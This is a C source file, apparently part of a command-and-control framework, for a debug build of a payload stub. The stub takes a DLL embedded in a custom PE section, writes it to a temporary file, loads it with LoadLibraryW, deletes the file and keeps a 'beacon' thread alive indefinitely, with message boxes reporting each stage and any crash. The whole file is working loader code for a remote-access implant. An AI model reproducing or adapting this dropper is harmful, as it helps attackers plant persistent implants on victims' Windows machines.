// exe_debug.c -- artifact stub with debug MessageBoxes.
//
// Identical to exe_basic but prints a MessageBoxA at each stage.
// Uses a Vectored Exception Handler (VEH) instead of SUEF so that
// exceptions inside DllEntry (caught by the loader's own SEH) are
// also reported before the loader swallows them.
// Use exe_basic in production.

#include <windows.h>

#define MAX_PAYLOAD (512 * 1024)
#define MAGIC_U64 0x4C59415048324F43ULL

#pragma section(".co2pay", read)
__declspec(allocate(".co2pay"))
static const unsigned char g_payload[MAX_PAYLOAD + 12] = {
    'C','O','2','H','P','A','Y','L',
    0,0,0,0,
};

static void dbg(const char* title, const char* msg) {
    MessageBoxA(NULL, msg, title, MB_OK | MB_ICONINFORMATION);
}

static void dbg_err(const char* title) {
    DWORD err = GetLastError();
    char buf[128];
    wsprintfA(buf, "GetLastError = %lu (0x%lX)", err, err);
    MessageBoxA(NULL, buf, title, MB_OK | MB_ICONERROR);
}

// ---- VEH: fires before ANY SEH frame, including the loader's wrapper --------
// Returns EXCEPTION_CONTINUE_SEARCH so normal handling proceeds after our
// dialog -- loader still gets to convert DllEntry crashes to DLL_INIT_FAILED.
static LONG WINAPI veh_handler(EXCEPTION_POINTERS* ep) {
    DWORD code = ep->ExceptionRecord->ExceptionCode;

    // Skip "soft" / informational exceptions (debug thread-name, Ctrl+C, etc.)
    // These have the top nibble 0x4... (STATUS_SUCCESS severity + customer bit).
    if ((code & 0xF0000000) == 0x40000000) return EXCEPTION_CONTINUE_SEARCH;

    // Single-step and breakpoint are benign in non-debug stubs.
    if (code == 0x80000003 || code == 0x80000004) return EXCEPTION_CONTINUE_SEARCH;

    void* addr = ep->ExceptionRecord->ExceptionAddress;

    // Identify the faulting module via VirtualQuery.
    char modname[MAX_PATH];
    modname[0]='<'; modname[1]='u'; modname[2]='n'; modname[3]='k';
    modname[4]='n'; modname[5]='o'; modname[6]='w'; modname[7]='n';
    modname[8]='>'; modname[9]=0;

    MEMORY_BASIC_INFORMATION mbi;
    if (VirtualQuery(addr, &mbi, sizeof(mbi)) && mbi.Type == MEM_IMAGE) {
        GetModuleFileNameA((HMODULE)mbi.AllocationBase, modname, sizeof(modname));
        // Strip path: keep filename only.
        char* p = modname;
        char* last = modname;
        while (*p) { if (*p == '\\' || *p == '/') last = p + 1; ++p; }
        if (last != modname) {
            int i = 0;
            while (last[i]) { modname[i] = last[i]; ++i; }
            modname[i] = 0;
        }
    }

    char buf[512];
    wsprintfA(buf,
        "Exception in beacon DLL!\n\n"
        "Code:    0x%08lX\n"
        "Address: 0x%p\n"
        "Module:  %s\n\n"
        "Codes:\n"
        "  C0000005 = Access Violation\n"
        "  C00000FD = Stack Overflow\n"
        "  C0000374 = Heap Corruption\n"
        "  C0000409 = Stack Buffer Overrun (/GS)\n"
        "  C000001D = Illegal Instruction\n",
        code, addr, modname);
    MessageBoxA(NULL, buf, "VEH CAUGHT", MB_OK | MB_ICONERROR);

    // CONTINUE_SEARCH: let the loader/OS finish handling.
    // If crash was in DllEntry, LoadLibraryW will return NULL next.
    return EXCEPTION_CONTINUE_SEARCH;
}

void __stdcall stub_main(void) {

    // VEH fires before loader's SEH -- catches DllEntry crashes too.
    AddVectoredExceptionHandler(1, veh_handler);

    dbg("stub stage 1/6", "entered");

    // 1. Magic
    if (*(unsigned long long *)g_payload != MAGIC_U64) {
        dbg("stub stage 1 FAIL", "magic mismatch -- artifact-gen did not patch");
        ExitProcess(1);
    }
    dbg("stub stage 2/6", "magic OK");

    // 2. Size
    unsigned int dll_size = *(unsigned int *)(g_payload + 8);
    {
        char buf[64];
        wsprintfA(buf, "payload size = %u bytes", dll_size);
        dbg("stub stage 3/6", buf);
    }
    if (!dll_size || dll_size > MAX_PAYLOAD) {
        dbg("stub stage 3 FAIL", "size is zero or too big");
        ExitProcess(1);
    }

    const unsigned char *dll_bytes = g_payload + 12;

    // 3. Write to %TEMP%
    wchar_t tmpdir[MAX_PATH + 1], tmppath[MAX_PATH + 1];
    GetTempPathW(MAX_PATH, tmpdir);
    if (!GetTempFileNameW(tmpdir, L"c2h", 0, tmppath)) {
        dbg_err("stub stage 4 FAIL: GetTempFileNameW");
        ExitProcess(1);
    }
    {
        char ascii[MAX_PATH * 2];
        WideCharToMultiByte(CP_ACP, 0, tmppath, -1, ascii, sizeof(ascii), NULL, NULL);
        dbg("stub stage 4/6", ascii);
    }

    HANDLE hf = CreateFileW(tmppath, GENERIC_WRITE, 0, NULL,
                            CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hf == INVALID_HANDLE_VALUE) {
        dbg_err("stub stage 4 FAIL: CreateFileW");
        DeleteFileW(tmppath);
        ExitProcess(1);
    }

    DWORD written = 0;
    if (!WriteFile(hf, dll_bytes, dll_size, &written, NULL) || written != dll_size) {
        dbg_err("stub stage 4 FAIL: WriteFile");
        CloseHandle(hf);
        DeleteFileW(tmppath);
        ExitProcess(1);
    }
    CloseHandle(hf);
    dbg("stub stage 5/6", "DLL written to tmp file, calling LoadLibraryW");

    // 4. LoadLibrary -- the critical step
    HMODULE mod = LoadLibraryW(tmppath);
    if (!mod) {
        dbg_err("stub stage 5 FAIL: LoadLibraryW");
        DeleteFileW(tmppath);
        ExitProcess(1);
    }
    DeleteFileW(tmppath);

    dbg("stub stage 6/6", "LoadLibraryW OK -- beacon thread started. "
        "Close this dialog to keep beacon alive (Sleep INFINITE).");

    Sleep(INFINITE);
    ExitProcess(0);
}
